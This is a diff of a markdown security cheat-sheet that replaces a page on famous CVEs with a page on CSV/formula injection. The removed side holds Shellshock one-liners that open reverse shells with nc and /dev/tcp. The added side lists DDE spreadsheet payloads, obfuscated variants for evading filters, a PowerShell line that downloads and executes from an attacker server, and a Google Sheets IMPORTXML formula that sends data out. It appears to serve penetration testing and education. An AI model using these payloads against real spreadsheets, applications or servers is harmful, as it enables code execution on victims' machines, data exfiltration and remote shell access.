@@ -1,85 +1,92 @@
-# Common Vulnerabilities and Exposures
+# CSV Injection
 
-> A CVE (Common Vulnerabilities and Exposures) is a unique identifier assigned to a publicly known cybersecurity vulnerability. CVEs help standardize the naming and tracking of vulnerabilities, making it easier for organizations, security professionals, and software vendors to share information and manage risks associated with these vulnerabilities. Each CVE entry includes a brief description of the vulnerability, its potential impact, and details about affected software or systems.
+> Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
 
 ## Summary
 
-* [Tools](#tools)
-* [Big CVEs in the last 15 years](#big-cves-in-the-last-15-years)
-    * [CVE-2017-0144 - EternalBlue](#cve-2017-0144---eternalblue)
-    * [CVE-2017-5638 - Apache Struts 2](#cve-2017-5638---apache-struts-2)
-    * [CVE-2018-7600 - Drupalgeddon 2](#cve-2018-7600---drupalgeddon-2)
-    * [CVE-2019-0708 - BlueKeep](#cve-2019-0708---bluekeep)
-    * [CVE-2019-19781 - Citrix ADC Netscaler](#cve-2019-19781---citrix-adc-netscaler)
-    * [CVE-2014-0160 - Heartbleed](#cve-2014-0160---heartbleed)
-    * [CVE-2014-6271 - Shellshock](#cve-2014-6271---shellshock)
+* [Methodology](#methodology)
+    * [Google Sheets](#google-sheets)
 * [References](#references)
 
-## Tools
+## Methodology
 
-* [Trickest CVE Repository - Automated collection of CVEs and PoC's](https://github.com/trickest/cve)
-* [Nuclei Templates - Community curated list of templates for the nuclei engine to find security vulnerabilities in applications](https://github.com/projectdiscovery/nuclei-templates)
-* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
-* [CVE Details - The ultimate security vulnerability datasource](https://www.cvedetails.com)
+CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with:
 
-## Big CVEs in the last 15 years
-
-### CVE-2017-0144 - EternalBlue
-
-EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.
-
-Afftected systems:
-
-* Windows Vista SP2
-* Windows Server 2008 SP2 and R2 SP1
-* Windows 7 SP1
-* Windows 8.1
-* Windows Server 2012 Gold and R2
-* Windows RT 8.1
-* Windows 10 Gold, 1511, and 1607
-* Windows Server 2016
-
-### CVE-2017-5638 - Apache Struts 2
-
-On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the "Content-Type" header.
-
-### CVE-2018-7600 - Drupalgeddon 2
-
-A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.
-
-### CVE-2019-0708 - BlueKeep
-
-A remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
-
-### CVE-2019-19781 - Citrix ADC Netscaler
-
-A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution.
-
-Affected products:
-
-* Citrix ADC and Citrix Gateway version 13.0 all supported builds
-* Citrix ADC and NetScaler Gateway version 12.1 all supported builds
-* Citrix ADC and NetScaler Gateway version 12.0 all supported builds
-* Citrix ADC and NetScaler Gateway version 11.1 all supported builds
-* Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds
-
-### CVE-2014-0160 - Heartbleed
-
-The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).
-
-### CVE-2014-6271 - Shellshock
-
-Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.
-
-```powershell
-echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
-curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
+```text
+=
++
+–
+@
 ```
+
+Basic exploits with **Dynamic Data Exchange**.
+
+* Spawn a calc
+
+    ```text
+    DDE ("cmd";"/C calc";"!A0")A0
+    @SUM(1+1)*cmd|' /C calc'!A0
+    =2+5+cmd|' /C calc'!A0
+    =cmd|' /C calc'!'A1'
+    ```
+
+* PowerShell download and execute
+
+    ```text
+    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+    ```
+
+* Prefix obfuscation and command chaining
+
+    ```text
+    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
+    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+    =         cmd|'/c calc.exe'!A
+    ```
+
+* Using rundll32 instead of cmd
+
+    ```text
+    =rundll32|'URL.dll,OpenURL calc.exe'!A
+    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
+    ```
+
+* Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
+
+    ```text
+    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
+    ```
+
+Technical details of the above payloads:
+
+* `cmd` is the name the server can respond to whenever a client is trying to access the server
+* `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
+* `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data
+
+### Google Sheets
+
+Google Sheets allows some additional formulas that are able to fetch remote URLs:
+
+* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
+* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
+* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
+* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
+* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)
+
+So one can test blind formula injection or a potential for data exfiltration with:
+
+```text
+=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
+```
+
+Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.
 
 ## References
 
-* [The Heartbleed Bug - Heartbleed - April 7, 2014](https://web.archive.org/web/20260302163556/https://heartbleed.com/)
-* [Shellshock (software bug) - Wikipedia - September 29, 2014](https://web.archive.org/web/20140929214920/http://en.wikipedia.org:80/wiki/Shellshock_(software_bug))
-* [Apache Struts Equifax Hack Analysis Part 1: CVE-2017-5638 - Imperva - March 9, 2017](https://web.archive.org/web/20180305002332/https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)
-* [EternalBlue - Wikipedia - March 4, 2026](https://web.archive.org/web/20260304111336/https://en.wikipedia.org/wiki/EternalBlue)
-* [CVE-2019-0708 | Remote Desktop Services Remote Code Execution Vulnerability - Microsoft - November 4, 2020](https://web.archive.org/web/20201104070840/https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)
+* [CSV Excel Macro Injection - Timo Goosen, Albinowax - June 21, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)
+* [CSV Excel formula injection - Google Bug Hunter University - May 22, 2022](https://web.archive.org/web/20251126193606/https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
+* [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - November 30, 2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)
+* [From CSV to Meterpreter - Adam Chester - November 5, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)
+* [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - October 7, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)
+* [Three New DDE Obfuscation Methods - ReversingLabs - September 24, 2018](https://web.archive.org/web/20220928031043/https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
+* [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020](https://web.archive.org/web/20260115180627/https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)
